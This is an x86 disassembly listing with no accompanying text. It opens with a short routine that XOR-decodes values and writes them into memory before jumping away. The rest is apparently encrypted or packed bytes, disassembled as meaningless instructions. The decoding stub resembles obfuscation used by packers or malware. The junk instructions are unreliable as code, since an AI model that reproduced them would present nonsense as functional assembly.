  403855:	mov    ecx,DWORD PTR [ebp-0x10]
  403858:	xor    ecx,esi
  40385a:	mov    eax,0xffcd8d25
  40385f:	sub    eax,ecx
  403861:	add    DWORD PTR [ebp-0xc],eax
  403864:	mov    eax,DWORD PTR [ebp-0xc]
  403867:	mov    ecx,DWORD PTR [ebp-0x8]
  40386a:	mov    ecx,DWORD PTR [ecx]
  40386c:	mov    ecx,DWORD PTR [ecx]
  40386e:	mov    ecx,DWORD PTR [ecx]
  403870:	mov    DWORD PTR [ecx+0x1],eax
  403873:	mov    al,BYTE PTR [ebp-0x1]
  403876:	mov    ecx,DWORD PTR [ebp-0x8]
  403879:	mov    ecx,DWORD PTR [ecx]
  40387b:	mov    ecx,DWORD PTR [ecx]
  40387d:	mov    ecx,DWORD PTR [ecx]
  40387f:	push   DWORD PTR [ebp-0x2c]
  403882:	xor    al,0x6f
  403884:	sub    al,0xd
  403886:	mov    BYTE PTR [ecx],al
  403888:	jmp    0x405c4a
  40388d:	lods   eax,DWORD PTR ds:[esi]
  40388e:	mov    bh,0xe6
  403890:	ja     0x403876
  403892:	mov    ds:0xa508636b,eax
  403897:	fsubr  QWORD PTR fs:[eax-0x22cedd3c]
  40389e:	pop    edi
  40389f:	bound  esp,QWORD PTR [edx-0x23]
  4038a2:	pop    edi
  4038a3:	bound  esp,QWORD PTR [edx+0x1f]
  4038a6:	push   ecx
  4038a7:	mov    BYTE PTR [ecx-0x6cb61f44],ch
  4038ad:	fist   WORD PTR [esi+0x7535096b]
  4038b3:	addr16 call 0xe4eda2d0
  4038b9:	pop    ebx
  4038ba:	imul   ecx,DWORD PTR [eax],0xfffffff0
  4038bd:	in     al,dx
  4038be:	aaa    
  4038bf:	xchg   ecx,eax
  4038c0:	dec    ecx
  4038c1:	fs call 0x767d049
  4038c7:	loop   0x403880
  4038c9:	xchg   edi,eax
  4038ca:	sbb    ebx,DWORD PTR [ebx+0x24]
  4038cd:	cmp    BYTE PTR [eax],al
  4038cf:	in     al,0xcc
  4038d1:	in     eax,0x40
  4038d3:	test   esp,ebp
  4038d5:	ret    
  4038d6:	lds    ebp,FWORD PTR [esi+ebp*2+0x62]
  4038da:	sti    
  4038db:	adc    al,0x4f
  4038dd:	data16 xor BYTE PTR [ebx],ah
  4038e0:	sbb    cl,BYTE PTR [ecx]
  4038e2:	std    
  4038e3:	mov    eax,ds:0x63357a2f
  4038e8:	shl    BYTE PTR [eax],cl
  4038ea:	xchg   dl,al
  4038ec:	xchg   DWORD PTR [esi-0x1fe8074a],esi
  4038f2:	scas   eax,DWORD PTR es:[edi]
  4038f3:	test   al,0x34
  4038f5:	inc    edx
  4038f6:	cmp    BYTE PTR [esi+eiz*2+0x6820d705],cl
  4038fd:	sar    BYTE PTR [edi],1
  4038ff:	stos   DWORD PTR es:[edi],eax
  403900:	inc    edx
  403901:	fwait
  403902:	push   ecx
  403903:	jnp    0x403899
  403905:	jne    0x4038e6
  403907:	clc    
  403908:	popa   
  403909:	xchg   DWORD PTR [ebx-0x20bd91a7],ebp
  40390f:	jae    0x4038bd
  403911:	inc    DWORD PTR [ebp+0x64]
  403914:	inc    edx
  403915:	mov    al,ds:0x70016ff6
  40391a:	add    ebx,DWORD PTR [edi-0xc]
  40391d:	out    dx,eax
  40391e:	sbb    esi,esp
  403920:	(bad)
  403923:	jl     0x403984
  403925:	xchg   ecx,eax
  403926:	jmp    DWORD PTR [edi+0x39]
  403929:	sub    BYTE PTR [eax],ch
  40392b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40392c:	jno    0x40396d
  40392e:	into   
  40392f:	je     0x403981
  403931:	ins    BYTE PTR es:[edi],dx
  403932:	push   esi
  403933:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403934:	mov    edi,0xbbaeda54
  403939:	jp     0x403967
  40393b:	ins    BYTE PTR es:[edi],dx
  40393c:	ret    
  40393d:	cs jmp 0x976b:0xd1eb9d65
  403945:	cmp    eax,0x1373073d
  40394a:	xor    cl,BYTE PTR [ebx]
  40394c:	mov    bl,0xb2
  40394e:	inc    eax
  40394f:	mov    al,ds:0xa4d00eea
  403954:	and    eax,DWORD PTR [ebp-0x58]
  403957:	pop    ebp
  403958:	ja     0x4039a9
  40395a:	sub    DWORD PTR [eax+0x7f82d3ba],esi
  403960:	xchg   ebx,eax
  403961:	(bad)
  403964:	bound  eax,QWORD PTR [ebp+ebp*4+0xf8f4770]
  40396b:	push   ebx
  40396c:	sub    ch,BYTE PTR ds:0x6222b312
  403972:	fsubr  st(2),st
  403974:	ins    BYTE PTR es:[edi],dx
  403975:	mov    WORD PTR [eax-0x7e],cs
  403978:	(bad)  
  403979:	cld    
  40397a:	loopne 0x403913
  40397c:	xchg   edx,eax
  40397d:	cdq    
  40397e:	aaa    
  40397f:	mov    ecx,0xfcd6c8c
  403984:	fwait
  403985:	jp     0x403967
  403987:	dec    edi
  403988:	aaa    
  403989:	stos   BYTE PTR es:[edi],al
  40398a:	pop    ebp
  40398b:	lea    esp,[eax]
  40398d:	push   eax
  40398e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40398f:	int    0x6
  403991:	add    BYTE PTR [eax+esi*1+0x6817a347],bl
  403998:	adc    eax,0x1abe6a76
  40399d:	(bad)  
  40399f:	scas   al,BYTE PTR es:[edi]
  4039a0:	mov    ch,0xdd
  4039a2:	jl     0x403966
  4039a4:	sbb    ebx,DWORD PTR [edi-0x1a43acd4]
  4039aa:	sub    ah,bl
  4039ac:	mov    esp,0xed912b5
  4039b1:	or     cl,BYTE PTR [ebx]
  4039b3:	and    BYTE PTR [ebp-0x27],0x0
  4039b7:	adc    al,ch
  4039b9:	out    0x5a,eax
  4039bb:	iret   
  4039bc:	cmc    
  4039bd:	dec    edx
  4039be:	sub    al,ch
  4039c0:	xor    eax,0xa94e4ac1
  4039c5:	stc    
  4039c6:	repz pop edx
  4039c8:	xchg   edi,eax
  4039c9:	lock push cs
  4039cb:	retf   0x1638
  4039ce:	jns    0x403994
  4039d0:	sbb    bh,al
  4039d2:	pop    ebp
  4039d3:	add    eax,DWORD PTR ds:0x1296cdd3
  4039d9:	mov    dh,ah
  4039db:	jo     0x403990
  4039dd:	dec    edx
  4039de:	nop
  4039df:	adc    eax,0x98990231
  4039e4:	lds    edi,FWORD PTR [edx+0x291c72ef]
  4039ea:	pushf  
  4039eb:	cmp    eax,0x8c53390a
  4039f0:	dec    ebp
  4039f1:	sbb    dl,BYTE PTR [ebp-0x61]
  4039f4:	xor    ebp,DWORD PTR [eax-0x549b05d0]
  4039fa:	outs   dx,DWORD PTR ds:[esi]
  4039fb:	pop    esp
  4039fc:	jecxz  0x4039b2
  4039fe:	mov    bl,0xbe
  403a00:	in     al,dx
  403a01:	dec    ecx
  403a02:	pushf  
  403a03:	shl    dh,0x1b
  403a06:	push   esp
  403a07:	push   eax
  403a08:	js     0x403a27
  403a0a:	call   0xa3fc:0x3503409e
  403a11:	push   edx
  403a12:	not    esi
  403a14:	outs   dx,BYTE PTR ds:[esi]
  403a15:	fisubr DWORD PTR [edx+0x639aeee9]
  403a1b:	mov    ds:0x629a6aa4,eax
  403a20:	jno    0x4039d4
  403a22:	test   DWORD PTR [ecx-0x1b63d76a],esp
  403a28:	and    ch,bh
  403a2a:	and    DWORD PTR [ecx],ebp
  403a2c:	popf   
  403a2d:	sbb    eax,0x8b74046
  403a32:	jle    0x403a0e
  403a34:	jnp    0x4039e9
  403a36:	gs jnp 0x403a18
  403a39:	mov    BYTE PTR [esi-0x73be97be],cl
  403a3f:	fst    QWORD PTR [ecx-0x7274b3c]
  403a45:	cmp    edx,eax
  403a47:	sahf   
  403a48:	or     eax,0x70d06078
  403a4d:	imul   DWORD PTR [ebp-0x42]
  403a50:	push   eax
  403a51:	iret   
  403a52:	jle    0x403aa3
  403a54:	and    ah,al
  403a56:	cwde   
  403a57:	rcl    esi,1
  403a59:	loopne 0x4039f7
  403a5b:	adc    edi,DWORD PTR [ecx+0x517a6979]
  403a61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a62:	int    0x58
  403a64:	cbw    
  403a66:	ror    DWORD PTR [esi-0x34afa99a],0x45
  403a6d:	adc    DWORD PTR [esi],0x5146e8c2
  403a73:	sub    BYTE PTR [ecx-0x10],dl
  403a76:	inc    ebx
  403a77:	js     0x403ac9
  403a79:	std    
  403a7a:	pop    ebx
  403a7b:	and    eax,0x91eada34
  403a80:	xor    ebp,DWORD PTR [eax]
  403a82:	rcr    DWORD PTR [esi+0x3c2b9b81],0xd9
  403a89:	mov    ds:0x6001eef1,al
  403a8e:	cmp    DWORD PTR [ecx-0x3f],0xc8498ad5
  403a95:	(bad)  
  403a96:	out    0x81,eax
  403a98:	popf   
  403a99:	in     al,dx
  403a9a:	popf   
  403a9b:	test   DWORD PTR [edi+edi*8],ebp
  403a9e:	cwde   
  403a9f:	loopne 0x403a85
  403aa1:	push   ecx
  403aa2:	dec    eax
  403aa3:	push   cs
  403aa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403aa5:	(bad)  [edi]
  403aa7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403aa8:	loop   0x403a6c
  403aaa:	xlat   BYTE PTR ds:[ebx]
  403aab:	stos   BYTE PTR es:[edi],al
  403aac:	pop    esi
  403aad:	(bad)  
  403aae:	jae    0x403b20
  403ab0:	mov    esp,0x47026c29
  403ab5:	iret   
  403ab6:	shr    DWORD PTR [edx],cl
  403ab8:	mov    ds:0x82585dd0,eax
  403abd:	add    cl,BYTE PTR [ebx-0x78f86f44]
  403ac3:	add    ax,0x2eac
  403ac7:	adc    ebx,DWORD PTR [ecx]
  403ac9:	imul   ebx,edi,0x42
  403acc:	test   eax,0x8276b949
  403ad1:	lods   eax,DWORD PTR ds:[esi]
  403ad2:	add    edx,DWORD PTR [edx+0x21]
  403ad5:	or     al,0xaa
  403ad7:	fild   WORD PTR [edi-0x49]
  403ada:	dec    BYTE PTR [eax-0x32]
  403add:	mov    BYTE PTR [esi+0x1c],ah
  403ae0:	pop    eax
  403ae1:	push   ds
  403ae2:	test   BYTE PTR [edx],0xdf
  403ae5:	pop    ds
  403ae6:	pushf  
  403ae7:	aaa    
  403ae8:	pop    edx
  403ae9:	retf   
  403aea:	cmp    DWORD PTR [edx+ebx*2],esi
  403aed:	aas    
  403aee:	(bad)  
  403aef:	stos   DWORD PTR es:[edi],eax
  403af0:	lods   eax,DWORD PTR ds:[esi]
  403af1:	inc    esp
  403af2:	xor    DWORD PTR [edx+0x79],edx
  403af5:	imul   esi,DWORD PTR ds:0xe572d2e4,0xffffffd1
  403afc:	mov    ds:0xa63fb9ae,eax
  403b01:	push   esp
  403b02:	jne    0x403b63
  403b04:	call   0x13d6:0x5582e5a2
  403b0b:	push   ebx
  403b0c:	jmp    0x403af1
  403b0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b0f:	inc    edi
  403b10:	pop    esi
  403b11:	xchg   esp,eax
  403b12:	sar    BYTE PTR [ebp+0x921de6],1
  403b18:	stos   DWORD PTR es:[edi],eax
  403b19:	ja     0x403a9d
  403b1b:	lock aad 0x13
  403b1e:	add    esi,ebx
  403b20:	lea    ebx,[esi]
  403b22:	pop    edx
  403b23:	mov    WORD PTR [ebx],cs
  403b25:	mov    esp,?
  403b27:	mov    al,0xa8
  403b29:	retf   0xa81f
  403b2c:	or     eax,edx
  403b2e:	inc    eax
  403b2f:	xchg   bl,ch
  403b31:	ret    
  403b32:	mov    esp,0xb0c758b9
  403b37:	push   esp
  403b38:	or     ah,dh
  403b3a:	xchg   DWORD PTR [edi-0x36436fad],esi
  403b40:	jecxz  0x403b5c
  403b42:	(bad)
  403b45:	pop    edx
  403b46:	and    ebx,DWORD PTR [esi]
  403b48:	mov    eax,0x54d4a9b3
  403b4d:	sahf   
  403b4e:	jo     0x403af9
  403b50:	sbb    al,0x9
  403b52:	mov    ch,0xb5
  403b54:	out    0xf1,eax
  403b56:	fiadd  WORD PTR [esi+0x26]
  403b59:	out    dx,al
  403b5a:	jne    0x8ccc2011
  403b60:	ror    DWORD PTR [edi+0x14],0xb7
  403b64:	xchg   edi,eax
  403b65:	jno    0x403b1d
  403b67:	add    esp,ecx
  403b69:	int    0xcc
  403b6b:	mov    edi,0x7bed19cc
  403b70:	ins    BYTE PTR es:[edi],dx
  403b71:	daa    
  403b72:	dec    ebp
  403b73:	cmp    al,dh
  403b75:	(bad)  
  403b76:	push   esp
  403b77:	mov    dl,0x96
  403b79:	test   DWORD PTR [ebp-0x1993480f],ebp
  403b7f:	push   edx
  403b80:	test   al,0x61
  403b82:	js     0x403be4
  403b84:	outs   dx,DWORD PTR ds:[esi]
  403b85:	imul   edx,DWORD PTR [esi],0x1c046aca
  403b8b:	push   es
  403b8c:	ja     0x403b7d
  403b8e:	icebp  
  403b8f:	push   ebp
  403b90:	inc    eax
  403b91:	in     eax,dx
  403b92:	jmp    0x247d77c0
  403b97:	jmp    0x403b70
  403b99:	pushf  
  403b9a:	fnstcw WORD PTR [edi+0x4a]
  403b9d:	jl     0x403b4e
  403b9f:	mov    es:0x244e5cf5,eax
  403ba5:	dec    ebp
  403ba6:	mov    ah,0x97
  403ba8:	arpl   WORD PTR [esi],si
  403baa:	and    DWORD PTR [edi],esi
  403bac:	pop    ecx
  403bad:	add    eax,0x2eb069c
  403bb2:	gs mov esp,esi
  403bb5:	push   ebp
  403bb6:	push   edi
  403bb7:	mov    WORD PTR [edi-0x4c],cs
  403bba:	(bad)  [esi+eiz*8]
  403bbd:	das    
  403bbe:	iret   
  403bbf:	hlt    
  403bc0:	aas    
  403bc1:	jg     0x403bfb
  403bc3:	in     al,dx
  403bc4:	rcr    esp,1
  403bc6:	ds in  eax,0xa1
  403bc9:	jmp    0x403b65
  403bcb:	and    ah,bl
  403bcd:	sbb    eax,edi
  403bcf:	mov    eax,0x625f3769
  403bd4:	adc    dl,bl
  403bd6:	int    0x5b
  403bd8:	and    eax,DWORD PTR [ecx-0x4e]
  403bdb:	rol    BYTE PTR [esi],0x2f
  403bde:	pop    es
  403bdf:	adc    ah,BYTE PTR [ebp-0x62]
  403be2:	xor    al,0xaa
  403be4:	pop    ss
  403be5:	out    0x62,eax
  403be7:	or     ebx,DWORD PTR ds:0x17af6208
  403bed:	jp     0x403c4f
  403bef:	mov    gs,ebp
  403bf1:	jnp    0x403b9d
  403bf3:	mov    esi,0xb76c92f
  403bf8:	xchg   DWORD PTR [edi],ebx
  403bfa:	push   ss
  403bfb:	in     al,dx
  403bfc:	adc    eax,0xc2399b16
  403c01:	jno    0x403ba7
  403c03:	cld    
  403c04:	fisttp DWORD PTR [ebx+0x10eb1c32]
  403c0a:	loopne 0x403c14
  403c0c:	out    0xb3,al
  403c0e:	push   ebx
  403c0f:	test   DWORD PTR [edi-0x180fbf9c],ebx
  403c15:	sub    edx,ebx
  403c17:	call   0x394d:0xb0c0f613
  403c1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c1f:	mov    eax,0x71300ba0
  403c24:	push   ss
  403c25:	xchg   ebp,eax
  403c26:	mov    bh,0x64
  403c28:	jae    0x403c03
  403c2a:	inc    ebp
  403c2b:	ds and eax,0xe3522da3
  403c31:	in     eax,0xc8
  403c33:	xor    ebx,DWORD PTR [edi-0x20bae553]
  403c39:	fwait
  403c3a:	iret   
  403c3b:	xor    al,0x15
  403c3d:	inc    eax
  403c3e:	fs inc edx
  403c40:	adc    al,0x8a
  403c42:	and    edi,ebx
  403c44:	jmp    0x699:0x8864e15b
  403c4b:	inc    ebp
  403c4c:	ja     0x403c2c
  403c4e:	fadd   QWORD PTR [ebp-0x5e]
  403c51:	xor    DWORD PTR [eax],ebp
  403c53:	jns    0x403c2c
  403c55:	dec    esi
  403c56:	std    
  403c57:	fisubr DWORD PTR [eax+0x5]
  403c5a:	shr    DWORD PTR [edx-0x60da3d5c],1
  403c60:	dec    eax
  403c61:	sub    BYTE PTR [edx],dl
  403c63:	push   edi
  403c64:	xor    eax,0x1e7e4b58
  403c69:	fst    QWORD PTR [eax-0x14]
  403c6c:	mov    ebp,0xf482f240
  403c71:	xor    al,0x9f
  403c73:	jbe    0x403c8c
  403c75:	imul   ebx,DWORD PTR ds:0x8071885c,0xffffffc0
  403c7c:	inc    esi
  403c7d:	add    al,0x78
  403c7f:	jg     0x403c09
  403c81:	(bad)  
  403c82:	cmp    eax,0x58fbb2c1
  403c87:	or     DWORD PTR [edx-0xa],esp
  403c8a:	jo     0x403cf3
  403c8c:	adc    al,0x1f
  403c8e:	js     0x403c37
  403c90:	inc    esi
  403c91:	push   edi
  403c92:	pop    eax
  403c93:	inc    esp
  403c94:	fisub  DWORD PTR [edx]
  403c96:	in     al,0x13
  403c98:	mov    ds:0x539d04d3,eax
  403c9d:	mov    BYTE PTR [ecx+0x67e809e7],ch
  403ca3:	ins    BYTE PTR es:[edi],dx
  403ca4:	or     eax,0x83290372
  403ca9:	pop    ecx
  403caa:	cmp    ebx,DWORD PTR [esp+ebx*1]
  403cad:	sbb    esp,esi
  403caf:	inc    esp
  403cb0:	push   edx
  403cb1:	mov    cl,0x52
  403cb3:	leave  
  403cb4:	xor    BYTE PTR [ebx],cl
  403cb6:	test   BYTE PTR [esi+ecx*4+0x47c20151],dl
  403cbd:	(bad)  
  403cbf:	mov    al,ds:0xd3b05f2
  403cc4:	popa   
  403cc5:	loop   0x403d39
  403cc7:	mov    eax,DWORD PTR [esi+ebx*8]
  403cca:	sbb    DWORD PTR [eax],ebx
  403ccc:	xor    ah,BYTE PTR [edi]
  403cce:	popf   
  403ccf:	jl     0x403c5e
  403cd1:	mov    dh,0xb7
  403cd3:	out    dx,al
  403cd4:	(bad)  
  403cd5:	xchg   edi,eax
  403cd6:	dec    ebp
  403cd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cd8:	fsub   QWORD PTR [edi+0x3e]
  403cdb:	ret    0x1b41
  403cde:	ins    DWORD PTR es:[edi],dx
  403cdf:	mov    edi,0xa731c0d2
  403ce4:	xlat   BYTE PTR ds:[ebx]
  403ce6:	pop    esi
  403ce7:	or     ebp,DWORD PTR [eax-0x2e]
  403cea:	ss cli 
  403cec:	rcl    DWORD PTR [ebp+0x4b],cl
  403cef:	pop    ebp
  403cf0:	imul   ecx,DWORD PTR [ebp-0x63cd0b4c],0x64
  403cf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cf8:	pushf  
  403cf9:	mov    ds:0x75177678,al
  403cfe:	cmp    BYTE PTR [ebx],bh
  403d00:	push   ebp
  403d01:	(bad)  
  403d02:	cmp    bh,BYTE PTR [ebx+0x12c47c07]
  403d08:	mov    dl,0xd4
  403d0a:	add    al,0xab
  403d0c:	(bad)  
  403d0d:	rol    esp,1
  403d0f:	mov    BYTE PTR [esi-0x14],dl
  403d12:	cmc    
  403d13:	jne    0x403d5e
  403d15:	dec    ecx
  403d16:	mov    al,ds:0x2abce378
  403d1b:	das    
  403d1c:	xor    ah,dl
  403d1e:	pop    ebp
  403d1f:	pop    edx
  403d20:	and    eax,0x9ab5c14c
  403d25:	shr    DWORD PTR gs:[edx+0x14a99398],1
  403d2c:	adc    DWORD PTR [ecx],esi
  403d2e:	stos   DWORD PTR es:[edi],eax
  403d2f:	or     DWORD PTR [ebx+0x3f],ebx
  403d32:	jo     0x403d69
  403d34:	mov    BYTE PTR [edi-0x3f],ch
  403d37:	dec    ebp
  403d38:	ja     0x403cd1
  403d3a:	mov    eax,ds:0x2206f235
  403d3f:	outs   dx,DWORD PTR ds:[esi]
  403d40:	add    DWORD PTR [edx],esi
  403d42:	mov    esp,0x18376f3d
  403d47:	fstp   TBYTE PTR [eax+0x2c]
  403d4a:	or     bh,BYTE PTR ss:[ebx-0x4308ee96]
  403d51:	aad    0xca
  403d53:	jnp    0x403d07
  403d55:	xor    al,0x63
  403d57:	and    ch,BYTE PTR [edi-0x22]
  403d5a:	fsubr  DWORD PTR [ebx+edi*1+0x19ce59ff]
  403d61:	cmp    BYTE PTR [ebx],bh
  403d63:	push   ds
  403d64:	and    BYTE PTR [ecx+0x44ee0c0],dh
  403d6a:	ret    
  403d6b:	hlt    
  403d6c:	cmp    BYTE PTR [eax+0x13],0x7d
  403d70:	stos   DWORD PTR es:[edi],eax
  403d71:	loopne 0x403d4a
  403d73:	mov    bl,0x2d
  403d75:	push   cs
  403d76:	push   cs
  403d77:	retf   
  403d78:	mov    eax,0x166d01cc
  403d7d:	inc    esi
  403d7e:	aam    0xcc
  403d80:	rcl    DWORD PTR [ecx],1
  403d82:	daa    
  403d83:	lock xor dh,BYTE PTR [ecx+0x2f6cc996]
  403d8a:	mov    ds:0xca3b3c38,al
  403d8f:	xchg   ebp,eax
  403d90:	jp     0x403d20
  403d92:	push   es
  403d93:	push   0xffffff9c
  403d95:	inc    esi
  403d96:	std    
  403d97:	and    al,0x76
  403d99:	sti    
  403d9a:	push   eax
  403d9b:	fldcw  WORD PTR [edi+edx*1]
  403d9e:	clc    
  403d9f:	jp     0x403d3f
  403da1:	(bad)  
  403da2:	push   edi
  403da3:	lock or al,0x13
  403da6:	shr    BYTE PTR [ebp-0x56],cl
  403da9:	jnp    0x403dc7
  403dab:	stos   DWORD PTR es:[edi],eax
  403dac:	ror    BYTE PTR [esi-0x5b],0x25
  403db0:	sub    al,0xaf
  403db2:	fstp   QWORD PTR ds:0xe7af6e51
  403db8:	pop    esi
  403db9:	outs   dx,BYTE PTR ds:[esi]
  403dba:	add    esi,DWORD PTR [edx+esi*2-0x59]
  403dbe:	nop
  403dbf:	pop    ds
  403dc0:	push   0xe8e01ea6
  403dc5:	hlt    
  403dc6:	inc    edi
  403dc7:	aam    0xad
  403dc9:	adc    ecx,DWORD PTR [ebx-0x6a]
  403dcc:	call   0x102b:0x350bac7c
  403dd3:	mov    eax,ds:0x2492032c
  403dd8:	cwde   
  403dd9:	inc    esi
  403dda:	and    edx,DWORD PTR [edx]
  403ddc:	adc    eax,esi
  403dde:	dec    ecx
  403ddf:	jp     0x403e5e
  403de1:	adc    BYTE PTR [esi+0x68b3b353],ah
  403de7:	pop    ebp
  403de8:	call   0xb799a74d
  403ded:	ret    0x2017
  403df0:	sahf   
  403df1:	dec    edi
  403df2:	jns    0x403e00
  403df4:	(bad)  
  403df5:	iret   
  403df6:	retf   
  403df7:	stos   BYTE PTR es:[edi],al
  403df8:	push   cs
  403df9:	pop    esi
  403dfa:	pop    ecx
  403dfb:	in     eax,dx
  403dfc:	mov    dh,0x4b
  403dfe:	ins    BYTE PTR es:[edi],dx
  403dff:	nop
  403e00:	orps   xmm2,xmm4
  403e03:	mov    ebp,0x519ab774
  403e08:	mov    esi,0x155b58c
  403e0d:	push   0xcd0a7ef3
  403e12:	dec    ebx
  403e13:	adc    BYTE PTR [eax-0x60f7fd08],0x70
  403e1a:	xor    DWORD PTR [eax+0x54],0xad90ac7e
  403e21:	out    0xb3,eax
  403e23:	add    edx,DWORD PTR [eax+0x3fc82ec]
  403e29:	ret    
  403e2a:	ins    BYTE PTR es:[edi],dx
  403e2b:	ret    
  403e2c:	fistp  WORD PTR es:[ebx]
  403e2f:	test   DWORD PTR [edx+0x3f],ecx
  403e32:	daa    
  403e33:	pop    eax
  403e34:	sbb    DWORD PTR [eax+ebx*1],esi
  403e37:	jno    0x403e32
  403e39:	dec    edi
  403e3a:	ins    DWORD PTR es:[edi],dx
  403e3b:	outs   dx,DWORD PTR ds:[esi]
  403e3c:	test   al,0xee
  403e3e:	inc    ebx
  403e3f:	daa    
  403e40:	adc    DWORD PTR [ebx],ebp
  403e42:	lahf   
  403e43:	cdq    
  403e44:	in     eax,0x45
  403e46:	add    eax,0xb39f5f9b
  403e4b:	push   ecx
  403e4c:	mov    esp,0xade749ad
  403e51:	ins    BYTE PTR es:[edi],dx
  403e52:	dec    ebx
  403e53:	sub    edx,ebp
  403e55:	shr    DWORD PTR [edx+0x38],cl
  403e58:	adc    eax,0x1c072dba
  403e5d:	sahf   
  403e5e:	mov    al,ds:0x65a63c94
  403e63:	or     al,0xe3
  403e65:	movzx  esi,dh
  403e68:	cmp    al,BYTE PTR [eax]
  403e6a:	jno    0x403e90
  403e6c:	xor    ecx,DWORD PTR [esi-0x4f1c63d4]
  403e72:	and    DWORD PTR [eax+esi*1-0x69],eax
  403e76:	rol    ch,cl
  403e78:	sub    al,al
  403e7a:	sub    eax,0xa9e6f9c4
  403e7f:	mov    ebp,0xea0b9f91
  403e84:	mov    esi,0x94587fb3
  403e89:	jno    0x403e3a
  403e8b:	xor    eax,0xfdd79b5e
  403e90:	pop    ds
  403e91:	hlt    
  403e92:	fcomip st,st(3)
  403e94:	adc    dl,BYTE PTR [esi-0x8c2a864]
  403e9a:	test   DWORD PTR [esi+0x52],edx
  403e9d:	(bad)  
  403e9e:	out    dx,al
  403e9f:	(bad)  
  403ea0:	int3   
  403ea1:	push   ebx
  403ea2:	sub    al,bh
  403ea4:	pop    es
  403ea5:	aas    
  403ea6:	(bad)  
  403ea7:	pop    ds
  403ea8:	in     eax,0x9e
  403eaa:	pop    ebx
  403eab:	cmp    edi,DWORD PTR [esi]
  403ead:	inc    edx
  403eae:	xlat   BYTE PTR ds:[ebx]
  403eaf:	jo     0x403ecd
  403eb1:	hlt    
  403eb2:	pop    esi
  403eb3:	pop    eax
  403eb4:	or     ebx,ebx
  403eb6:	or     al,0x28
  403eb8:	lods   al,BYTE PTR ds:[esi]
  403eb9:	popf   
  403eba:	leave  
  403ebb:	(bad)  
  403ebc:	xchg   ecx,eax
  403ebd:	xor    DWORD PTR [ebx+eiz*1+0x2],ebx
  403ec1:	hlt    
  403ec2:	ja     0x403f0e
  403ec4:	sub    DWORD PTR [esi],0x39
  403ec7:	dec    edi
  403ec8:	jl     0x403e4f
  403eca:	fcom   QWORD PTR [eax+0x3f]
  403ecd:	jmp    0xf97783b0
  403ed2:	jmp    0x1ca:0xc43e7614
  403ed9:	xor    BYTE PTR [ecx+ebp*2-0x4f],al
  403edd:	mov    ds:0x7c9a1769,eax
  403ee2:	add    ebp,0x7dfd5093
  403ee8:	add    eax,0xdfa07aa9
  403eed:	test   BYTE PTR [edi],0x7b
  403ef0:	out    dx,al
  403ef1:	push   edx
  403ef2:	mov    bh,0x42
  403ef4:	sahf   
  403ef5:	ins    DWORD PTR es:[edi],dx
  403ef6:	xchg   BYTE PTR [ebx+0x44876c73],al
  403efc:	cld    
  403efd:	sbb    eax,0x62ffba10
  403f02:	push   0xe
  403f04:	xchg   ebp,eax
  403f05:	in     eax,0x39
  403f07:	sbb    ecx,DWORD PTR [edx]
  403f09:	iret   
  403f0a:	and    DWORD PTR [edi+0x40247951],edi
  403f10:	pop    ecx
  403f11:	mov    dl,bh
  403f13:	rol    BYTE PTR [ecx+0x1b0d774b],0x4d
  403f1a:	cmp    BYTE PTR [ebx],0xb4
  403f1d:	pop    ss
  403f1e:	int3   
  403f1f:	out    dx,al
  403f20:	mov    edi,0xaacef655
  403f25:	cdq    
  403f26:	and    eax,0xf1163019
  403f2b:	sub    eax,0xf564fabb
  403f30:	fwait
  403f31:	lea    esi,[ebx+0x72c74d5c]
  403f37:	mov    al,ds:0x167bfd8a
  403f3c:	test   DWORD PTR [edi-0x3e],esp
  403f3f:	jbe    0x403fb2
  403f41:	inc    eax
  403f42:	fild   QWORD PTR [eax+0x44cd2913]
  403f48:	jp     0x403edd
  403f4a:	xchg   esi,eax
  403f4b:	mov    bh,0xd6
  403f4d:	repnz push 0x2e
  403f50:	(bad)
  403f53:	int    0x84
  403f55:	cmp    DWORD PTR [eax-0x5bc29234],0x25
  403f5c:	ror    BYTE PTR [edi*1+0x7e7e1c36],cl
  403f63:	mov    ebx,0xb0fe2ee0
  403f68:	cdq    
  403f69:	adc    ch,bl
  403f6b:	push   edi
  403f6c:	pop    eax
  403f6d:	cmp    ah,BYTE PTR [eax+0x326a3a51]
  403f73:	fnstenv [esi-0x484d3214]
  403f79:	adc    DWORD PTR [esi-0x51],ebx
  403f7c:	enter  0xddf3,0xdb
  403f80:	dec    edi
  403f81:	pop    eax
  403f82:	es mov esi,0x4a49be28
  403f88:	jno    0x403f4b
  403f8a:	push   0x5710c6a8
  403f8f:	add    edi,edx
  403f91:	mov    ah,BYTE PTR [esi]
  403f93:	fwait
  403f94:	jno    0x404011
  403f96:	pop    esp
  403f97:	(bad)  
  403f98:	shl    DWORD PTR [ebp-0x1],1
  403f9b:	add    BYTE PTR [edx],ah
  403f9d:	mov    dh,BYTE PTR [esp+eax*4-0x5f]
  403fa1:	call   0x45ee24b2
  403fa6:	test   DWORD PTR [ebp-0x6d7bbffb],ebp
  403fac:	mov    edx,0x6a18b070
  403fb1:	inc    edi
  403fb2:	adc    bl,cl
  403fb4:	add    DWORD PTR [ebx+0x7ae62e5f],ebp
  403fba:	outs   dx,DWORD PTR ds:[esi]
  403fbb:	dec    esp
  403fbc:	dec    ebx
  403fbd:	mov    ds:0x9759137,eax
  403fc2:	and    al,0xa4
  403fc4:	or     eax,0x273ae508
  403fc9:	mov    bl,0xe1
  403fcb:	push   ecx
  403fcc:	add    esp,eax
  403fce:	cmp    al,0x16
  403fd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fd1:	dec    eax
  403fd2:	int    0xd9
  403fd4:	xor    BYTE PTR [ecx-0x35],bl
  403fd7:	cmp    al,BYTE PTR [ebx]
  403fd9:	jbe    0x40402f
  403fdb:	int    0xf9
  403fdd:	cs test bh,bl
  403fe0:	sub    BYTE PTR [esi+ebp*2-0x2a],al
  403fe4:	or     eax,0xa4e224af
  403fe9:	or     eax,DWORD PTR [esi+eax*8]
  403fec:	sahf   
